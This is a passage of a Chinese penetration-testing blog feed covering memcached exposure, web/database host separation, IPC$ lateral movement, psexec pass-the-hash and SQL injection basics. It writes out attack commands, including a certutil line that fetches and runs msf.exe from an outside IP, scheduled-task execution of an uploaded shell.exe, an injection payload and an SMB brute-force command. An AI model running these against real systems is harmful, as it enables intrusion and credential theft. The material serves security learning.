class="line">telnet xx.xx.xx.xx 11211</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ telnet ip 11211</span><br><span class="line">Trying ip...</span><br><span class="line">Connected to ip.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br></pre></td></tr></table></figure><p>nmap扫描</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV  -p 端口 --script memcached-info IP</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-11-16 17:56 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> ip</span><br><span class="line">Host is up (<span class="number">0.54</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE   VERSION</span><br><span class="line"><span class="number">11211</span>/tcp open  memcached Memcached <span class="number">1.4</span><span class="number">.13</span> (uptime <span class="number">27164261</span> seconds)</span><br><span class="line">| memcached-info:</span><br><span class="line">|   Process ID: <span class="number">1121</span></span><br><span class="line">|   Uptime: <span class="number">27164262</span> seconds</span><br><span class="line">|   Server time: <span class="number">2020</span><span class="number">-11</span><span class="number">-16</span>T09:<span class="number">43</span>:<span class="number">25</span></span><br><span class="line">|   Architecture: <span class="number">64</span> bit</span><br><span class="line">|   Used CPU (user): <span class="number">1792.059996</span></span><br><span class="line">|   Used CPU (system): <span class="number">2583.961487</span></span><br><span class="line">|   Current connections: <span class="number">7</span></span><br><span class="line">|   Total connections: <span class="number">8070135</span></span><br><span class="line">|   Maximum connections: <span class="number">1024</span></span><br><span class="line">|   TCP Port: <span class="number">11211</span></span><br><span class="line">|   UDP Port: <span class="number">0</span></span><br><span class="line">|_  Authentication: no</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">15.20</span> seconds</span><br></pre></td></tr></table></figure><p>常用指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stats &#x2F;&#x2F;查看memcache 服务状态 </span><br><span class="line">stats items &#x2F;&#x2F;查看所有items </span><br><span class="line">stats cachedump 32 0 &#x2F;&#x2F;获得缓存key </span><br><span class="line">get :state:264861539228401373:261588 &#x2F;&#x2F;通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><h4 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h4><h5 id="从web入口"><a href="#从web入口" class="headerlink" title="从web入口"></a>从web入口</h5><p>通过web入口可以通过web漏洞getshell，getshell之后获取数据库配置文件、对数据库内容进行分析，主要找到数据库ip。</p><h5 id="从数据库入口渗透"><a href="#从数据库入口渗透" class="headerlink" title="从数据库入口渗透"></a>从数据库入口渗透</h5><p>获取数据库账号、密码</p><p>在mysql中可以查看用户正在运行的线程，进而得到数据库ip地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.processlist</span><br></pre></td></tr></table></figure><p>在mssql中是否判断站酷分离</p><p>获取客户端主机名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host_name();</span><br></pre></td></tr></table></figure><p>获取服务端主机名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@servername;</span><br></pre></td></tr></table></figure><p>如果客户端主机名和服务端主机名一直则是同站同数据库，如果不是则是站库分离。</p><h5 id="站库分离的判断方法"><a href="#站库分离的判断方法" class="headerlink" title="站库分离的判断方法"></a>站库分离的判断方法</h5><h6 id="查看网络连接状态"><a href="#查看网络连接状态" class="headerlink" title="查看网络连接状态"></a>查看网络连接状态</h6><p>通过Netstat命令查看MSSQL数据库1433端口的网络连接状态，可以看到与当前MSSQL数据库服务器192.168.32.8建立连接的只有192.168.32.3，由此可以判断这台主机为Web服务器，并且站库分离。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr &quot;1433&quot;</span><br></pre></td></tr></table></figure><h6 id="查看当前服务器的IP"><a href="#查看当前服务器的IP" class="headerlink" title="查看当前服务器的IP"></a>查看当前服务器的IP</h6><p>数据库配置文件</p><p>通过网站程序数据库配置文件来判断是否站库分离，如果数据库IP地址是localhost、127.0.0.1或当前主机内网IP则说明为同服务器，反之则可能为站库分离。</p><p>MySQL内置函数和库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@hostname;                                 &#x2F;&#x2F;服务端主机名称</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.PROCESSLIST;      &#x2F;&#x2F;客户端主机名称和端口</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201110222106564.png" alt="image-20201110222106564"></p><p>MSSQL注入语句</p><p>执行下面语句，如果页面正常回显，说明<code>host_name()=@@servername</code>即数据库服务端主机名称与数据库客户端主机名称一样，说明站库不分离。否则站库分离。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select * from news where 1&#x3D;(SELECT (case when host_name()&#x3D;@@servername then 1 else 0 end)))</span><br></pre></td></tr></table></figure><p>MSSQL内置函数和表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select host_name();                       &#x2F;&#x2F;客户端主机名称</span><br><span class="line">select @@servername;                      &#x2F;&#x2F;服务端主机名称</span><br><span class="line">select serverproperty(&#39;MachineName&#39;);     &#x2F;&#x2F;服务端主机名称</span><br></pre></td></tr></table></figure><p>其他配置文件</p><p>通过load_file()这个内置函数读取一些敏感文件，hosts文件、IIS/Apache/Nginx/Tomcat/Jboss/Weblogic/Websphere的相关配置文件以及网卡信息等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts&#39;);</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules          &#x2F;&#x2F;获取网卡名称</span><br><span class="line">&#x2F;etc&#x2F;network&#x2F;interfaces                            &#x2F;&#x2F;DHCP或静态IP</span><br></pre></td></tr></table></figure><h5 id="站库分离利用思路"><a href="#站库分离利用思路" class="headerlink" title="站库分离利用思路"></a>站库分离利用思路</h5><p>下载远程木马文件</p><p>目标主机允许通外网时我们可以利用Vbs/Ftp/IPC$/Certutil/Bitsadmin/Powershell等方式来下载远程文件到可读写目录中，然后再去执行一下即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;155.**.***.229:8888&#x2F;msf.exe C:\ProgramData\msf.exe</span><br><span class="line">C:\ProgramData\msf.exe</span><br></pre></td></tr></table></figure><p>使用metasploit模块</p><p>在数据库服务器中，没有web服务我们无法上传webshell，比如上传php、jsp、aspx等文件到目标服务器，执行webshell进而拿到shell。这时候我们可以使用msf的模块，该模块监听一个端口，但是不是生成一个exe木马，或者是一个编程语言的webshell，而是利用对方主机能够执行命令的特点，来获取一个shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Metasploit下的exploit&#x2F;multi&#x2F;script&#x2F;web_delivery和exploit&#x2F;windows&#x2F;misc&#x2F;hta_server两个模块来执行远程Payload获取会话</span><br></pre></td></tr></table></figure><p>模拟令牌权限提升</p><p>通过Incognito扩展中的模拟令牌功能获取到数据库服务器的Admin/SYSTEM令牌。</p><p>通过Windows身份验证，使用数据库连接工具，比如sqlcmd、SSMS和Navicat Premium等。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一个网站的渗透思路&quot;&gt;&lt;a href=&quot;#一个网站的渗透思路&quot; class=&quot;headerlink&quot; title=&quot;一个网站的渗透思路&quot;&gt;&lt;/a&gt;一个网站的渗透思路&lt;/h3&gt;&lt;h4 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>内网学习--横向纵横2</title>
    <link href="http://s1eady.top/2020/09/26/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA2/"/>
    <id>http://s1eady.top/2020/09/26/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA2/</id>
    <published>2020-09-26T07:26:44.270Z</published>
    <updated>2020-12-10T15:09:12.043Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网学习–横向纵横2"><a href="#内网学习–横向纵横2" class="headerlink" title="内网学习–横向纵横2"></a>内网学习–横向纵横2</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><h3 id="什么是IPC？"><a href="#什么是IPC？" class="headerlink" title="什么是IPC？"></a>什么是IPC？</h3><p>进程间通信(inter-process communication或interprocess communication，简写IPC)是指两个或两个以上进程(或线程)之间进行数据或信号交互的技术方案。命名管道(Named pipe或FIFO)是实现IPC的一个方法，可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持可靠的、单向或双向的数据通信。所以通过IPC的命令管道符，具有网络文件共享能力，通过他具有相应权限的用户可以远程管理计算机并查看计算机共享资源(主机的目录结构、文件、用户列表)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IPC$和windows的SMB共享都是复用了445端口，它们都基于SMB协议实现，但是IPC$的作用范围更大一些，它是服务器间进程间通信方式。</span><br></pre></td></tr></table></figure><h3 id="IPC作用"><a href="#IPC作用" class="headerlink" title="IPC作用"></a>IPC作用</h3><p>利用IPC$,连接者可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。尤其是目标主机没有开启3389，可以利用IPC进行上传木马、获取shell等操作。</p><h3 id="ipc-与空连接、139、445端口、默认共享的关系"><a href="#ipc-与空连接、139、445端口、默认共享的关系" class="headerlink" title="ipc$与空连接、139、445端口、默认共享的关系"></a>ipc$与空连接、139、445端口、默认共享的关系</h3><h4 id="ipc-与空连接"><a href="#ipc-与空连接" class="headerlink" title="ipc$与空连接"></a>ipc$与空连接</h4><p>不需要用户名与密码的ipc$连接即为空连接，空连接是没有任何权限，而使用账户密码登录是有相应的权限。</p><h4 id="ipc-与139、445端口"><a href="#ipc-与139、445端口" class="headerlink" title="ipc$与139、445端口"></a>ipc$与139、445端口</h4><p>ipc$连接可以实现远程登陆及对默认共享的访问;而139端口的开启表示netbios协议的应用,我们可以通过139,445端口实现对共享文件/打印机的访问,因此一般来讲,ipc$连接是需要139或445端口来支持的。</p><h4 id="ipc-与默认共享"><a href="#ipc-与默认共享" class="headerlink" title="ipc$与默认共享"></a>ipc$与默认共享</h4><p>默认共享是为了方便管理员远程管理而默认开启的共享,即所有的逻辑盘<code>(c$,d$,e$……)</code>和系统目录winnt或windows(admin$),我们通过ipc$连接可以实现对这些默认共享的访问。</p><h2 id="基于IPC-的横向移动"><a href="#基于IPC-的横向移动" class="headerlink" title="基于IPC$的横向移动"></a>基于IPC$的横向移动</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>查看是否开启IPC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\good&gt;net share</span><br><span class="line"></span><br><span class="line">共享名       资源                            注解</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">C$           C:\                             默认共享</span><br><span class="line">IPC$                                         远程 IPC</span><br><span class="line">ADMIN$       C:\Windows                      远程管理</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>建立空连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;&quot; &#x2F;u:&quot;&quot;</span><br></pre></td></tr></table></figure><p>建立正常连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:&quot;账户&quot; </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;good&quot; &#x2F;user:&quot;Administrator&quot; </span><br></pre></td></tr></table></figure><p>查看本机连接共享情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure><p>查看已建立连接目标主机的共享资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view \\192.168.1.1</span><br></pre></td></tr></table></figure><p>删除本机与指定ip建立的连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.1\ipc$ &#x2F;del &#x2F;y</span><br></pre></td></tr></table></figure><p>删除本机所有已建立的连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use * &#x2F;del &#x2F;y</span><br></pre></td></tr></table></figure><p>文件的上传下载</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xcopy d:\good\*.* \\<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>\c$\temp /E /Y /D</span><br></pre></td></tr></table></figure><p>上传本地文件到目标的<code>c\windows\temp\</code>目录下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>\c$\good.exe c:\</span><br></pre></td></tr></table></figure><p>下载目标文件到本地c盘下</p><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><h4 id="Impacket中的psexec-py"><a href="#Impacket中的psexec-py" class="headerlink" title="Impacket中的psexec.py"></a>Impacket中的psexec.py</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>psexec 是 windows 下非常好的一款远程命令行工具。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>不需要对方主机开机3389端口，只需要对方开启admin$共享(该共享默认开启)。如果关闭了admin$共享，会提示：找不到网络名。</li><li>目标主机未开启防火墙</li><li>杀毒软件未将其添加到白名单中。</li></ul><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为”PSEXESVC”的二进制文件。在使用psexec执行远程命令时，会在目标系统中创建一个psexec服务。命令执行后，psexec服务将会被自动删除。因此在使用该工具的时候会产生大量的日志。</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><h6 id="工作组环境"><a href="#工作组环境" class="headerlink" title="工作组环境"></a>工作组环境</h6><p>psexec只能使用 administrator 账号登录，使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</p><h6 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h6><p>默认情况下，只有使用域用户，并且这个域用户在远程计算机的管理员组中的时候，可以直接进行连接，但本地管理员组中除Administrator用户外无法进行连接；</p><h6 id="使用密码登录与哈希登录"><a href="#使用密码登录与哈希登录" class="headerlink" title="使用密码登录与哈希登录"></a>使用密码登录与哈希登录</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#用明文密码连接python3 psexec.py 域名&#x2F;administrator:密码@192.168.10.131</span><br><span class="line">#用哈希值连接python3 psexec.py 域名&#x2F;administrator@192.168.10.131 -hashes AADA8EDA23213C025AE50F5CD5697D9F:6542D35ED5FF6AE5E75B875068C5D3BC</span><br></pre></td></tr></table></figure><h4 id="IPC-计划任务"><a href="#IPC-计划任务" class="headerlink" title="IPC+计划任务"></a>IPC+计划任务</h4><p>与目标机器建立连接之后，将木马放入对方目录配合计划任务定时执行，目标主机即可上线。</p><p>上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy shell.exe \\192.168.210.102\c$\tmp</span><br></pre></td></tr></table></figure><p>定时任务执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS &#x2F;Create &#x2F;TN calc &#x2F;TR C:shell.exe &#x2F;SC DAILY &#x2F;ST 9:00</span><br></pre></td></tr></table></figure><p>或者at命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 11:43 cmd &#x2F;c C:shell.exe</span><br></pre></td></tr></table></figure><h4 id="IPC445端口爆破"><a href="#IPC445端口爆破" class="headerlink" title="IPC445端口爆破"></a>IPC445端口爆破</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan  -h 10.10.10.5 -p 445 -user Administrator -pwd jo6ek6vul3vm,6 -domain WEGO -np</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内网学习–横向纵横2&quot;&gt;&lt;a href=&quot;#内网学习–横向纵横2&quot; class=&quot;headerlink&quot; title=&quot;内网学习–横向纵横2&quot;&gt;&lt;/a&gt;内网学习–横向纵横2&lt;/h1&gt;&lt;h2 id=&quot;IPC&quot;&gt;&lt;a href=&quot;#IPC&quot; class=&quot;header</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>SQL--SQL注入漏洞</title>
    <link href="http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-22T14:46:26.000Z</published>
    <updated>2020-11-10T07:51:52.387Z</updated>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当前数据库用户、数据库中的表等信息，也可以读取敏感文件、写入服务器shell，进而获取主机权限。</p><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>MySQL 5.0以上版本。</p><p>数据库</p><ul><li><p><strong>information_schema</strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。</p></li></ul><p>表</p><ul><li><p><strong>SCHEMATA</strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等。</p></li><li><p><strong>TABLES</strong></p><p>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</p></li><li><p><strong>COLUMNS</strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| Tables_in_information_schema          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| TABLES                                |</span><br><span class="line">| SCHEMATA                              |</span><br><span class="line">| COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| COLUMNS                               |</span><br><span class="line">mysql&gt; desc TABLES;</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type                | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG   | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA    | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_TYPE      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ENGINE          | varchar(<span class="number">64</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| VERSION         | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| ROW_FORMAT      | varchar(<span class="number">10</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_ROWS      | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AVG_ROW_LENGTH  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_LENGTH     | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| MAX_DATA_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| INDEX_LENGTH    | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_FREE       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AUTO_INCREMENT  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| CHECK_TIME      | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COLLATION | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| CHECKSUM        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_OPTIONS  | varchar(<span class="number">255</span>)        | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COMMENT   | varchar(<span class="number">2048</span>)       | NO   |     |         |       |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">mysql&gt; desc COLUMNS;</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field                    | Type                | Null | Key | Default | Extra |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG            | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA             | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME               | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_NAME              | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ORDINAL_POSITION         | bigint(<span class="number">21</span>) unsigned | NO   |     | <span class="number">0</span>       |       |</span><br><span class="line">| COLUMN_DEFAULT           | longtext            | YES  |     | NULL    |       |</span><br><span class="line">| IS_NULLABLE              | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| DATA_TYPE                | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| CHARACTER_MAXIMUM_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_OCTET_LENGTH   | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_PRECISION        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_SCALE            | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATETIME_PRECISION       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_SET_NAME       | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLLATION_NAME           | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLUMN_TYPE              | longtext            | NO   |     | NULL    |       |</span><br><span class="line">| COLUMN_KEY               | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| EXTRA                    | varchar(<span class="number">30</span>)         | NO   |     |         |       |</span><br><span class="line">| PRIVILEGES               | varchar(<span class="number">80</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_COMMENT           | varchar(<span class="number">1024</span>)       | NO   |     |         |       |</span><br><span class="line">| GENERATION_EXPRESSION    | longtext            | NO   |     | NULL    |       |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line"><span class="number">21</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>总结</p><p>MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema的表schemata中的列schema_name记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列table_schema记录了所有数据库的名字</span><br><span 